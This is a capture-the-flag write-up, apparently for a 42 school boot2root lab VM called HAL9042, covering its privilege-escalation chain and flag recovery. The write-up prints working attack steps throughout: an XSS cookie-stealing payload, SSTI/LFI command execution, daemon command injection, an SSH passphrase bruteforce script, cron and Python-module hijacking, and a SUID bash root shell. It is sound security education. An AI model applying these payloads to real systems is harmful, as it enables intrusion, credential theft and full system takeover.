# WRITEUP 3 - Boot2Root - Privilege Escalation Details

> [!CAUTION]
> This WriteUp was AI translated from the french WriteUp version, as I am exhausted with this project, i did not took time to review.

## Context: HAL9042 Box, pedagogical project of École 42

> [!NOTE]
> In this third WriteUp, we will exploit the vulnerabilities exposed in the first two to perform a privilege escalation ([Write Up 1](../writeup1/write_up_1.md) && [Write Up 2](../writeup2/write_up_2.md)). It is recommended to review them before proceeding.

I will not detail all the user enumeration steps performed as part of this project here, as traces can be found *(maintained more or less regularly in the [LOGBOOK](../utils/LOG_BOOK.md))*

However, we have an overview of the escalation to be performed in the description of the appliance provided with the subject:

### USERS

| Order | User |  | Done ? | 
| ----- | ----- | ----- | ----- | 
| 1 | www-data | 💻 | ✅ [Click](./write_up_3.md#a-taking-control-of-www-data) | 
| 2 | paco | 🔐 | ✅ [Click](./write_up_3.md#b-taking-control-of-paco) | 
| 3 | wil | 🕵️ | ✅ [Click](./write_up_3.md#c-taking-control-of-wil) | 
| 4 | sophie | 🧠 | ✅ [Click](./write_up_3.md#d-taking-control-of-sophie) | 
| 5 | ol | 🛡️ | ✅ [Click](./write_up_3.md#e-taking-control-of-ol) | 
| 6 | root | 👑 | ✅ [Click](./write_up_3.md#f-escalation-to-root) | 

### RECOVERING THE `.key_part` FILES

The `.key_part` files will allow us to decrypt a report from `ol`.

`paco`'s encryption script, `encrypt.py`, explains that we need to concatenate the 4 `.key_part` files in a precise order to decrypt the report:

1. `ol`

* **Prerequisite**: Have the `paco->wil` pivot.

* **Recovery**: Explained further down [Click](./write_up_3.md#e-taking-control-of-ol).

2. `wil`

* **Prerequisite**: Have the `paco -> wil` pivot.

* **Recovery**:

  * Wil's `.key_part` is located in the `/home/wil/data` directory.

  * We use the pivot to `cat` the `.key_part`: `echo "DEBUG: cd /home/wil/data && cat .key_part" | nc 127.0.0.1 7042`

* **Result**: `847_4n0m4l13s`

3. `sophie`

* **Prerequisite**: Have an SSH connection to `sophie`'s session.

* **Recovery**:

  * Once on `sophie`'s session, the `.key_part` is located in the directory: `/home/sophie/drafts/.key_part`.

  * From the session: `cd drafts/ && cat .key_part`

* **Result**: `S0ph13_J14`

4. `xavier`

* **Prerequisite**: At a minimum, be able to exploit the `LFI` presented in Write Up 1.

* **Recovery**:

  * Several system or user files mention `xavier`.

  * In `paco`'s `encrypt.py` file, we are directly given the path `/tmp/.xn/.key_part`. No need to complicate things here, we will use the `LFI`.

  * `./get_file.sh /tmp/.xn/.key_part`

* **Result**: `uid1337`.

### FLAGS

| Number | Flag | 
| ----- | ----- | 
| 1 | [FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}](#1-flagn1c3_try_but_th4ts_n0t_h0w_th1s_w0rks) | 
| 2 | [FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}](#2-flagd3l3t3d_us3rs_l34v3_tr4c3s) | 
| 3 | [FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}](#3-flagx4v13r_w4s_3r4s3d_but_n0t_g0n3) | 
| 4 | [FLAG{h4l_r3v13ws_3v3ry_4pp34l}](#4-flagh4l_r3v13ws_3v3ry_4pp34l) | 
| 5 | [FLAG{b4sh_h1st0ry_1s_4_d14ry}](#5-flagb4sh_h1st0ry_1s_4_d14ry) | 
| 6 | [FLAG{udp_1s_4_wh1sp3r}](#6-flagudp_1s_4_wh1sp3r) | 
| 7 | [FLAG{r3c0n_1s_king}](#7-10-www-data-flags) | 
| 8 | [FLAG{g1t_n3v3r_f0rg3ts}](#7-10-www-data-flags) | 
| 9 | [FLAG{s3m1_bl1nd_st1ll_burns}](#7-10-www-data-flags) | 
| 10 | [FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}](#7-10-www-data-flags) | 
| 11 | [FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}](#11-flagp4c0_l3ft_th3_k3ys_und3r_th3_m4t) | 
| 12 | [FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}](#12-flagd3bug_m0d3_1s_4_f34tur3_r1ght) | 
| 13 | [FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}](#13-flagw1l_kn3w_f1rst_n0b0dy_l1st3n3d) | 
| 14 | [FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}](#14-flagcr0n_j0bs_4r3_tr4ps_4nd_g1fts) | 
| 15 | [FLAG{m0ul1n3tt3_w4a_n3v3r_ju5t_4_scr1pt}](#15-flagm0ul1n3tt3_w4a_n3v3r_ju5t_4_scr1pt) | 

#### #1 **FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}**

Using SSTI on `/evaluate` with `/var/www/hal9042` privileges:

```
./post_evaluate.sh "find /var/www/hal9042 -type f -exec grep -Hn '/flag' {} +"

```

> \[!TIP\]
> Recursively traverses `/var/www/hal9042`, selects only regular files, searches for `/flag` in their content, displaying the file and line number for each occurrence, grouped within a grep.

Output :

```
Project under evaluation: /var/www/hal9042/app.py:81:        &#34;Disallow: /flag\n&#34;
/var/www/hal9042/app.py:82:        &#34;Disallow: /flag.txt\n&#34;
/var/www/hal9042/app.py:92:@app.route(&#34;/flag&#34;)
/var/www/hal9042/app.py:93:@app.route(&#34;/flag.txt&#34;)
/var/www/hal9042/app.py:99:        &#34;The flags are not lying around in /flag.\n&#34;

```

Thus:

```
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ curl http://10.0.2.2:5042/flag                                                
FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}

HAL9042: I appreciate the optimism.
The flags are not lying around in /flag.
Did you really think it would be that easy?
(I logged this request. I log everything. It's mostly the only thing I do.)

```

The result is the same on `http://10.0.2.2:5042/flag.txt`

#### #2 **FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}**

> [!NOTE]
> The discovery of this flag is detailed in the [LOGBOOK](../utils/LOG_BOOK.md). I will be more brief here.

While enumerating `xavier`'s files, we discover that his session was deleted after he had the misfortune of asking questions about the `FORK` project.

A hint indicates that we can find traces of `xavier` under his ID `1337`.

We find a binary `/var/backups/xbackup`. If we cat it, a flag appears in the file: `FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}`.

Otherwise, the subject mentions that false leads are deliberately inserted to make us waste time, which is what happened:

* If we try to run it:

  * `usage: xbackup <src> <dest>`.

  * `(deleted users leave traces. so do their tools.)`

* **Binary strings**: we see a `xavier-recovery-token`.

* `xavier-recovery-token`: it is actually an address stored in reality within `.rodata`, which actually just contains the flag. No recovery token in reality.

#### #3 **FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}**

* Discovery context:
  During user enumeration, I found a file named `rapport_v1.md` in `/home/ol/rapport/`. In this report, we are invited to use the 4 key fragments to open the sealed report: `rapport_final.enc`.

  At this point, we make the connection between the script `/home/paco/scripts/encrypt.py` and this report.

* Decrypting `rapport_final.enc`:
  The file is encrypted in `AES-256-ECB`. After reconstructing the key, the file can be decrypted to retrieve the plaintext report.
  To reconstruct the key, `encrypt.py` invites us to retrieve the [4 fragments](./write_up_3.md#recuperation-des-key_part). Once these fragments are in our possession, we can use the program to recover the `AES-256-ECB` key:

  ```
  paco@hal9042:~/scripts$ python3 encrypt.py 'M0ul1n3tt3' '847_4n0m4l13s' 'S0ph13_J14' 'uid1337'
  380f5c29228093385507c1a9e351610a9144105e358e35abb8539250c033b44e
  
  ```

* Reading the report and obtaining the flag:
  We reuse the `open_report` command from the script: `openssl enc -d -K <our key> -in /home/ol/rapport/rapport_final.enc -out rapport_final.txt`.

  Inside this report, we discover the flag: `FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}`

#### #4 **FLAG{h4l_r3v13ws_3v3ry_4pp34l}**

* Discovery context:

  * We spot the `appeal` route in the source code of the `app.py` application.

  * Confirmation of the vulnerability thanks to `./get_file.sh` (LFI exploitation).
    Reading `/var/www/hal9042/templates/appeal_view.html` indicates that the `reason` field is rendered with a Jinja2 `| safe` filter, meaning it considers user input as such and does not perform HTML escaping. **This is an XSS vulnerability** very similar to what we encountered in [Darkly](https://github.com/LaGuibole/darkly2.0).

  * Identification of an exfiltration channel via `/api/ingest`. This route accepts any type of data via the `?c=` QueryParam.

  * Visitor process: `ps aux | grep halrev` reveals that `halrev` runs a Python script `reviewer.py` which drives `Playwright + Chromium` in headless mode, i.e., a real browser executing JS.

* Exploitation:

  * `project=`: We can put whatever we want here, not that important.

  * `reason=`: `<script>fetch('/api/ingest?c='+encodeURIComponent(document.cookie))</script>`

  * `halrev`'s visit to `/api/appeal/<id>` fires the execution of the malicious code and logs the last 50 reviews in `/api/ingest`.

* Recovery:

  * `curl http://10.0.2.2:5042/api/ingest` = `hal_session=hal-reviewer-7e3f1a; flag=FLAG{h4l_r3v13ws_3v3ry_4pp34l}`

#### #5 **FLAG{b4sh_h1st0ry_1s_4_d14ry}**

* Discovery context:

  * The script `/opt/hal9042/services/telemetry.py` indicates that an HTTP server listens on `127.0.0.1` and can expose the value of the `FLAG` environment variable on `/internal/telemetry`. *P.S: Loaded from `/etc/hal9042/telemetry.env`, alongside many `.env` entries set to `rw` for `root` only*.

  * Even though with `sophie`'s session we cannot directly read the file containing the secret, the telemetry service itself is accessible locally on port `9000`.

* Exploitation:

  * This simple command is enough for us to retrieve the flag: `curl http://127.0.0.1:9000/internal/telemetry`

  * The server returns: `FLAG{b4sh_h1st0ry_1s_4_d14ry}`

The secret is simply accessible from a local HTTP endpoint without auth or access control.

#### #6 **FLAG{udp_1s_4_wh1sp3r}**

* Discovery context:

  * The script `/opt/hal9042/services/whisper.py` sets up a UDP telemetry server on port `1337` and the service listens on `0.0.0.0` i.e., all network interfaces.

  * Reading this script allows us to understand what it expects: `expected handshake: MAGIC <hostname>`

  * `echo "test" | nc -u 127.0.0.1 1337` => `expected handshake: KNOCK <hostname>`

* Exploitation:

  * Now that we know the exact handshake format expected by the server, we build it.

  * `hostname` = `hal9042`

  * therefore: `echo "KNOCK hal9042" | nc -u 127.0.0.1 1337`

* Recovery:

  * `FLAG{udp_1s_4_wh1sp3r}`

> [!NOTE]
> The flags that follow are certainly the mandatory part flags. They were discovered late, once I had obtained a `root` session. I started looking for missing flags from here.

#### Interlude: flagd.service

Once root access was obtained via the privesc chain, exploring the system from the `root` context revealed something I had overlooked until now: the existence of a flag distribution service by UID.

In the `/etc/` directory, we find `/etc/flagd` which contains a `flagd.conf` file:

```
www|33|FLAG{r3c0n_1s_k1ng}
FLAG{g1t_n3v3r_f0rg3ts}
FLAG{s3m1_bl1nd_st1ll_burns}
FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}|not www-data. the web frontend runs as www-data — get a shell via the semi-blind SSTI on /evaluate (header X-Debug-Render: true) or the LFI->RCE on /api/debug.
paco|1001|FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}|.env.old in /home/paco was never cleaned up. it holds paco's ssh password.
wil|1002|FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}|hal9042d listens on 127.0.0.1:7042 and runs as wil. debug mode was never disabled — strings the binary.
sophie|1003|FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}|wil kept an encrypted ssh key for sophie (~wil/.ssh/id_rsa_sophie.enc). the passphrase is the most common one there is.
ol|1004|FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}|ol's cron runs /home/ol/scripts/check.sh as ol every 5 minutes. who can write it?

```

From here, we can assume that an associated service must be running, which we confirm:

```
rootbash-5.2# systemctl status flagd
● flagd.service - HAL9042 flag broker (uid-gated unix sockets)
     Loaded: loaded (/etc/systemd/system/flagd.service; enabled; preset: enabled)
     Active: active (running) since Mon 2026-10-12 12:57:11 UTC; 16min ago
   Main PID: 649 (flagd)
      Tasks: 1 (limit: 2263)
     Memory: 232.0K (peak: 1.3M)
        CPU: 5ms
     CGroup: /system.slice/flagd.service
             └─649 /usr/local/sbin/flagd

Oct 12 12:57:11 hal9042 systemd[1]: Started flagd.service - HAL9042 flag broker (uid-gated u>
lines 1-11/11 (END)

```

The service name `(uid-gated unix sockets)` explains the access control mechanism used.

Since the binary is not stripped (meaning it contains debug info), we can extract the symbols via `strings`, which is the same mechanism used for `xavier`'s backup.

```
rootbash-5.2# strings /usr/local/sbin/flagd

getsockopt
accept
bind / listen / socket
%s/%s.sock <-- .sock are here: /run/flagd
ERROR: cannot read peer credentials
ERROR: unauthorized. expected uid=%u, got uid=%u.

```

**What concretely happens**: `flagd` creates a Unix socket per user. `SO_PEERCRED` allows this service to verify the real identity of the client process; it compares the UID of the connection to the socket with the one in the configuration file, refusing connections that do not match.

**Recovery mechanism**: Launch a connection to the socket via `nc` as follows:

```
nc -U /run/flagd/<user>.sock

```

This is roughly the equivalent of the `getflag` we saw in SnowCrash a while back.

#### #7-10 **www-data FLAGS**

* Using the `flagd` service then:

```
┌──(kali㉿kali)-[~]
└─$ ./boot2root_scripts/post_evaluate.sh "nc -U /run/flagd/www.sock"
Project under evaluation: FLAG{r3c0n_1s_k1ng}
FLAG{g1t_n3v3r_f0rg3ts}
FLAG{s3m1_bl1nd_st1ll_burns}
FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}

```

#### 11 **FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}**

* Using the `flagd` service from a connection to `paco`'s session to get the correct UID:

```
paco@hal9042:~$ nc -U /run/flagd/paco.sock
FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}

```

#### 12 **FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}**

* Using the `paco->wil` pivot:

```
paco@hal9042:~$ echo "DEBUG:nc -U /run/flagd/wil.sock" | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}

```

#### 13 **FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}**

* Once connected to `sophie`'s session:

```
sophie@hal9042:~$ nc -U /run/flagd/sophie.sock
FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}

```

#### 14 **FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}**

* To retrieve this flag, we will exploit the `check.sh` script, enumerating the commands to run:

```
1. echo 'DEBUG: echo "#!/bin/bash" > /tmp/test' | nc 127.0.0.1 7042
2. echo 'DEBUG: echo "LOG=/var/log/hal9042/check.log" >> /tmp/test' | nc 127.0.0.1 7042
3. echo 'DEBUG: echo "nc -U /run/flagd/ol.sock >> \$LOG" >> /tmp/test' | nc 127.0.0.1 7042
4. echo 'DEBUG: echo "$(cat /tmp/test)" > /home/ol/scripts/check.sh' | nc 127.0.0.1 7042 

```

* Checking `cat /var/log/hal9042/check.log`, we find: `FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}`

#### 15 **FLAG{m0ul1n3tt3_w4a_n3v3r_ju5t_4_scr1pt}**

This last flag is contained in the PDF sealed by Sophie addressed to the board. It is mentioned in several places via hints.

The said PDF is accessible from the moment we have a `root` shell under the name: `PROJET_FORK_HAL9042.pdf`

To be able to open it easily from a desktop environment, I copied it here `/home/paco`. First, we `chmod 777` the pdf.

From my Kali VM: `scp -P 6060 paco@10.0.2.2:/root/PROJET_FORK_HAL9042.pdf ~/Desktop`.

When trying to open the PDF, we are asked for a password. Knowing that `sophie` sealed this PDF, we check her `.bash_history`:

```
sophie@hal9042:~$ cat /home/sophie/.bash_history
ls -la drafts/
cat inbox/board_launch_order.txt
# board wants the FORK doc restricted before it goes to /root
qpdf --encrypt "Pr0j3tF0rk_J14" "Pr0j3tF0rk_J14" 256 -- fork_draft.pdf PROJET_FORK_HAL9042.pdf
sudo mv PROJET_FORK_HAL9042.pdf /root/
shred -u fork_draft.pdf
# quick check the internal telemetry endpoint is still up (F14 hint)
curl -s "http://127.0.0.1:9000/internal/telemetry"
vi drafts/mail_ol_sorry_unsent.txt
clear

```

We can see the password that `sophie` used to seal the PDF: `Pr0j3tF0rk_J14`

We can now open the PDF, read it, and retrieve the last flag.

## KILL CHAIN

### A. Taking control of `www-data`

Control over the www-data shell is achieved via `SSTI (Server Side Template Injection)` exposed in [Write Up 2](../writeup2/write_up_2.md).

Using our custom script `./post_evaluate.sh` allows executing commands with this user's privileges.

```
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ ./post_evaluate.sh "whoami"                                                   
Project under evaluation: www-data

```

### B. Taking control of `paco`

1. User file enumeration allows us to retrieve his credentials from `/home/paco/.env.old`:

```
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ ./get_file.sh "/home/paco/.env.old"
# old deploy env — paco. delete this. (you will not delete this)
DB_PASS=Moulinette2024!
SECRET_KEY=hal9042secret
# ssh creds used by the deploy bot
SSH_USER=paco
SSH_PASS=Pac0_H4L_dev!

```

2. Port enumeration performed at the beginning of the project allowed us to identify port `6060` as the port for the `ssh` service:

```
┌──(kali㉿kali)-[~]
└─$ ssh -p 6060 paco@10.0.2.2
paco@10.0.2.2's password: Pac0_H4L_dev!
paco@hal9042:~$

```

### C. Taking control of `wil`

1. Once connected to `paco`'s session, reviewing `.bash_history` reveals two things:

```
cd /home/paco/src
gcc -O2 -o /opt/hal9042/daemon evaluator.c <========= HERE
nc 127.0.0.1 7042
echo "DEBUG:id" | nc 127.0.0.1 7042 <======== AND HERE

```

Analyzing `evaluator.c`:

```
system(cmd);            /* executes as wil */

```

2. **The Pivot**: The `hal9042d` daemon on port 7042 is only accessible locally via `127.0.0.1`. It has a debug handler that executes the line shown above `system(cmd)` with `wil`'s privileges as soon as the entered command starts with `DEBUG:`.

   The pivot is therefore achieved as follows:

```
paco@hal9042:~$ echo "DEBUG:whoami" | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> wil
> 

```

> [!TIP]
> Why do we talk about "local" execution?
>
> The `hal9042d` daemon listens exclusively on `127.0.0.1:7042`.
>
> It is necessary to execute the request from the target machine and not from a remote machine.
>
> **WARNING:** "local" here describes where the service is accessible from, not the user running the command.
>
> The `whoami` command is executed by `hal9042d` via `system(cmd)`. It therefore inherits the privileges of the daemon running under `wil`.
>
> `paco` does not directly obtain `wil`'s privileges; abusing the local service executed by `wil` allows `paco` to execute their command from another context.

### D. Taking control of `sophie`

1. `wil` states in his notes `/home/wil/notes/personal_notes.txt`:

```
paco@hal9042:/home/wil/notes$ cat personal_note.txt 
847 evaluations that make no sense. i counted them twice.

i sent sophie three alerts. the first one was calm. the third one wasn't.
the auto-reply said she was out of office. she wasn't. i saw her in the bocal.

== HERE == 
i kept a copy of sophie's old access key, encrypted, just in case the project
got buried with me. the passphrase is something she'd never guess i remembered.
== HERE == 

it's the most common password in the world. she used to laugh at people for it.

i cost more than €0.0003 per evaluation.
i think that's the whole problem, actually.

```

2. To consult the copy of `sophie`'s SSH key backed up by `wil`, we must go through his privileges:

```
paco@hal9042:/home/wil/.ssh$ echo "DEBUG: cd /home/wil/.ssh && cat id_rsa_sophie.enc" | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> -----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
> ^C

```

> [!IMPORTANT]
> In my case it was already done, otherwise don't forget to add permissions for `sophie`'s SSH key: `chmod 600 id_rsa_sophie.enc`

3. Connecting with the passphrase:

* Hints suggest that the SSH key passphrase is one of the most common passwords.

* I therefore developed this bruteforce script to test the most common passwords for the passphrase:

`bruteforce.sh`:

```
#!/bin/bash

KEY="$1"
WORDLIST="$2"

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <private_key> <wordlist>"
    exit 1
fi

while IFS= read -r password; do
    echo "Testing: [$password]"
    if ssh-keygen -y -P "$password" -f "$KEY" >/dev/null 2>&1; then
        echo "[+] Passphrase found: $password"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] No passphrase found."
exit 1

```

> [!TIP]
> The `WORDLIST` used on my side is available directly on Kali distros: `/usr/share/john/password.lst`

4. Result:

```
┌──(kali㉿kali)-[~]
└─$ ./bruteforce.sh id_rsa_sophie.enc /usr/share/john/password.lst
Testing: [123456]
Testing: [12345]
Testing: [password]
Testing: [password1]
Testing: [123456789]
... [etc]...
... [etc]...
Testing: [iloveyou]
[+] Passphrase found = iloveyou

```

5. Confirmation:

```
┌──(kali㉿kali)-[~]
└─$ ssh -p 6060 -i id_rsa_sophie.enc sophie@10.0.2.2
Enter passphrase for key 'id_rsa_sophie.enc': iloveyou

sophie@hal9042:~$ 

```

### E. Taking control of `ol`

1. From `sophie`'s SSH session, it is possible to inspect `/home/ol/scripts/check.sh`:

```
sophie@hal9042:/home/ol/scripts$ cat check.sh 
#!/bin/bash
# check.sh — HAL9042 health probe
# Run from ol's crontab every 5 minutes. Writes a heartbeat to the log.
#
# ol: keep this lightweight. it runs as me, every 5 min, forever.

LOG=/var/log/hal9042/check.log
echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null

```

2. This is interesting because this script is run from `ol`'s crontab every 5 minutes, hence with his privileges. For instance, we cannot view her `.key_part`, but the permissions on the script are as follows:

```
sophie@hal9042:/home/ol/scripts$ ls -la
-rwxrwxr-x 1 ol evalops  380 Jun  6 12:30 check.sh

```

Members of the `evalops` group have `rwx` permissions on the script.

3. `wil` belongs to the evalops group:

```
sophie@hal9042:/home/ol/scripts$ getent group evalops
evalops:x:1001:wil

```

4. The pivot is therefore clear: we must modify the `check.sh` script using `wil`'s privileges, for example by trying to cat the `.key_part` which is `rw` only for `ol`. This would confirm the escalation.

5. **Execution**

* Modifying the script by appending:

```
sophie@hal9042:/home/ol/scripts$ echo 'DEBUG:echo "echo \"\$(date -u +%FT%TZ) [KEYPART] \$(cd /home/ol/.config && cat .key_part)\" >> \"\$LOG\"" >> /home/ol/scripts/check.sh' | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.

```

* Verification:

```
sophie@hal9042:/home/ol/.config$ cd ../scripts/ && cat check.sh
#!/bin/bash
# check.sh — HAL9042 health probe
# Run from ol's crontab every 5 minutes. Writes a heartbeat to the log.
#
# ol: keep this lightweight. it runs as me, every 5 min, forever.

LOG=/var/log/hal9042/check.log
echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null
echo "$(date -u +%FT%TZ) [KEYPART] $(cd /home/ol/.config && cat .key_part)" >> "$LOG" ==> OK

```

* We wait for execution by the crontab under `ol`'s privileges:

```
2026-09-23T14:15:02Z [KEYPART] M0ul1n3tt3

```

### F. Escalation to `root`

1. From `sophie`'s SSH session, as previously observed when obtaining a flag, the script `/home/ol/scripts/check.sh` can be modified via the `wil->ol` pivot and this script is executed periodically (cron job, every 5 min). This will be our entry point for the entire escalation.

2. The script `/opt/hal9042/script/report.py` is particularly interesting. It is executable with `sudo` by `ol` and therefore runs with `root` privileges:

```
sophie@hal9042:~$ cat /opt/hal9042/scripts/report.py

#!/usr/bin/env python3

import sys

sys.path.insert(0, "/opt/hal9042/lib")

import moulai_utils

def main():
    print("[report] HAL9042 nightly report")
    print("[report] evaluations today:", moulai_utils.count_today())
    print("[report] done.")

if __name__ == "__main__":
    main()

```

It is important to note that the `/opt/hal9042/lib` directory is placed first as a Python search path, and then `report.py` imports `moulai_utils`.

`moulai_utils.py` belongs to the `hal9042` group; nice, `ol` belongs to this group and allows us to modify this script via `check.sh`.

3. Writing to `moulai_utils.py`, `check.sh`, and executing `report.py`:

> [!TIP]
> The main difficulty here lies in quoting levels: commands are built via `infect_step*.sh`, sent to the `hal9042d` daemon, then written to `check.sh` before being interpreted by the shell when the cron runs. *P.S: I use a /tmp/test file so I could easily view the result and not destroy `check.sh` on every script error.*

4. **Reconstructing `check.sh`**
   To simplify life and stop polluting logs, we clean `check.sh`:

```
# ./infect_step0.sh
#!/bin/bash

echo 'DEBUG: echo "#!/bin/bash" > /tmp/test' | nc 127.0.0.1 7042

```

5. **Defining the `log` file**

```
# ./infect_step1.sh
#!/bin/bash

echo 'DEBUG: echo "LOG=/var/log/hal9042/check.log" >> /tmp/test' | nc 127.0.0.1 7042

```

6. **Injecting Python code into `moulai_utils`**

```
# ./infect_step2.sh
#!/bin/bash

echo 'DEBUG: echo "echo \"open('\''/tmp/root_escal.txt'\'','\''w'\'').write('\''created as root'\'')\" > /opt/hal9042/lib/moulai_utils.py" >> /tmp/test' | nc 127.0.0.1 7042

```

Result: `open('/tmp/root_escal.txt','w').write('created as root')`

7. **Executing `report.py` with `sudo` privileges**

```
# ./infect_step3.sh
#!/bin/bash

echo 'DEBUG: echo "sudo /opt/hal9042/scripts/report.py >> \"\$LOG\"" >> /tmp/test' | nc 127.0.0.1 7042

```

8. **`/tmp/test` ==> `check.sh`**

```
# ./infect_step4.sh
#!/bin/bash

echo 'DEBUG: echo "$(cat /tmp/test)" > /home/ol/scripts/check.sh' | nc 127.0.0.1 7042

```

9. When `check.sh` runs via the crontab with `ol`'s privileges, it modifies `moulai_utils.py`, then runs `report.py` with `sudo`.

`report.py` then imports `moulai_utils.py`. In Python, global statements in a module are executed upon import (no need to recreate `count_time()`). The injected instruction thus creates the file `/tmp/root_escal.txt` with the privileges of the process launching `report.py`, i.e., `sudo`.

10. After the cron runs:

```
sophie@hal9042:~$ cd /tmp && ls -la
-rw-r--r--  1 root   root        15 Sep 25 13:15 root_escal.txt

sophie@hal9042:/tmp$ cat /tmp/root_escal.txt 
created as root

```

File creation proves that the code injected into `moulai_utils.py` executed in the privileged `root` context.

11. **Bonus: obtaining a persistent `root` shell**
    Having demonstrated the vulnerability via the file creation PoC, the most interesting step is having a persistent interactive shell. I therefore modified the injection script in `moulai_utils.py` as follows:

```
# ./infect_step2_bis.sh
#!/bin/bash

echo 'DEBUG: echo "echo \"import os; os.system('\''cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'\'')\" > /opt/hal9042/lib/moulai_utils.py" >> /tmp/test' | nc 127.0.0.1 7042

```

When `report.py` runs, `moulai_utils.py` is imported with `root` process privileges. The `os.system()` instruction is therefore also executed in this context.

We create a copy of bash in `/tmp` then set the `SUID` bit on this copy by giving it 755 permissions.

Verifying permissions:

```
ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1446024 Sep 25 14:25 /tmp/rootbash

```

We successfully switch from an `x` to an `s` on owner permissions.

> [!IMPORTANT]
> The SUID bit means that when a user executes `/tmp/rootbash`, the program executes with the effective UID of the owner rather than the user launching the script.
>
> **Warning:** With bash: if it detects a difference between its real UID and effective UID, Bash may drop certain privileges (security).
> **Be sure to run:** `/tmp/rootbash -p`. This way, bash does not drop its effective privileges.

* Without `-p`:

```
sophie@hal9042:~$ /tmp/rootbash
rootbash-5.2$ whoami
sophie

```

* With `-p`:

```
sophie@hal9042:~$ /tmp/rootbash -p
rootbash-5.2# whoami
root

```